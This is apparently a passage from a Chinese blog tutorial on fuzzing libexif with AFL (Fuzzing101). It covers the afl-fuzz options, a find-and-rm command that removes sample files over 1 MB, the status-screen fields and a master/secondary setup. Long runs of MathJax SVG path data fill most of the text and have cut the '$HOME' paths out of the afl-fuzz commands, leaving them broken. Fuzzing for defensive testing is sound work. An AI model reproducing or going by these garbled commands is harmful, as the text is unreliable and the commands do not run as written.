<path stroke-width="1" id="E1-MJMATHI-4D" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"/>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-7A" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"/>
<path stroke-width="1" id="E1-MJMATHI-62" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/>
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-6A" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-48" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-4F" x="888" y="0"/>
 <use xlink:href="#E1-MJMATHI-4D" x="1652" y="0"/>
 <use xlink:href="#E1-MJMATHI-45" x="2703" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="3468" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="3968" y="0"/>
 <use xlink:href="#E1-MJMATHI-75" x="4519" y="0"/>
 <use xlink:href="#E1-MJMATHI-7A" x="5091" y="0"/>
 <use xlink:href="#E1-MJMATHI-7A" x="5560" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="6028" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="6374" y="0"/>
<g transform="translate(6974,0)">
 <use xlink:href="#E1-MJMATHI-67" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6C" x="675" y="-213"/>
</g>
 <use xlink:href="#E1-MJMATHI-69" x="7763" y="0"/>
 <use xlink:href="#E1-MJMATHI-62" x="8108" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="8538" y="0"/>
 <use xlink:href="#E1-MJMATHI-78" x="9004" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="9577" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="9922" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="10473" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="10973" y="0"/>
 <use xlink:href="#E1-MJMATHI-78" x="11440" y="0"/>
 <use xlink:href="#E1-MJMATHI-69" x="12012" y="0"/>
 <use xlink:href="#E1-MJMATHI-66" x="12358" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="13130" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="14131" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="14601" y="0"/>
 <use xlink:href="#E1-MJMATHI-6D" x="15130" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="16009" y="0"/>
 <use xlink:href="#E1-MJMATHI-6C" x="16512" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="16811" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="17277" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="17969" y="0"/>
 <use xlink:href="#E1-MJMATHI-6D" x="18969" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="19848" y="0"/>
 <use xlink:href="#E1-MJMATHI-73" x="20377" y="0"/>
 <use xlink:href="#E1-MJMATHI-74" x="20847" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="21208" y="0"/>
 <use xlink:href="#E1-MJMATHI-72" x="21675" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="22126" y="0"/>
 <use xlink:href="#E1-MJMATHI-6A" x="22627" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="23039" y="0"/>
 <use xlink:href="#E1-MJMATHI-67" x="23543" y="0"/>
 <use xlink:href="#E1-MJMAIN-2F" x="24023" y="0"/>
 <use xlink:href="#E1-MJMAIN-2212" x="24746" y="0"/>
 <use xlink:href="#E1-MJMATHI-6F" x="25747" y="0"/>
</g>
</svg>HOME/fuzzing_libexif/out/ -- <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/bin/exif @@<br><br>-i 是输入文件夹<br>-o 是输出文件夹<br>-- 分隔，后面带上需要fuzz的目标程序<br>@@ 表示是使用文件作为输入<br></code></pre></td></tr></table></figure>

<p>用的是 AFL-fuzz，会限制文件大小不能超过 1MB</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230321133430416.png"><span class="image-caption">image-20230321133430416</span></p>
<p>先找出大于 1M 的样本</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230321133940580.png"><span class="image-caption">image-20230321133940580</span></p>
<p>使用命令 <code>find . -size +1M -exec rm &#123;&#125; \;</code> 可以直接删除大于 1M 的样本。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230321164254624.png"><span class="image-caption">image-20230321164254624</span></p>
<p>然后就可以跑起来了。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230321164416820.png"><span class="image-caption">image-20230321164416820</span></p>
<p>对于上面的参数，需要了解的并不需要太多，如下的即可：</p>
<ul>
<li>run time：fuzzer 运行的总时长、</li>
<li>last new path：距离上一次发现新路径的间隔时间。</li>
<li>total path：总共发现的新路径数量。</li>
<li>map density：覆盖密度，如果达到 百分之六七十的话，会容易产生碰撞。可以考虑重新跑过，或者修改 map_size 的大小。</li>
</ul>
<p>如果想要多个 fuzzer 一起运行的话，可以增加一个 -M 参数开启主从模式，如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">sudo /home/shoucheng/fuzz/AFL/afl-fuzz -i <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="60.928ex" height="2.843ex" style="vertical-align: -0.838ex;" viewbox="0 -863.1 26232.9 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">HOME/fuzzing_libexif/exif-samples-master/jpg/ -o </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-48" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/>
<path stroke-width="1" id="E1-MJMATHI-4F" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/>
<path stroke-width="1" id="E1-MJMATHI-4D" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"/>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-7A" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"/>
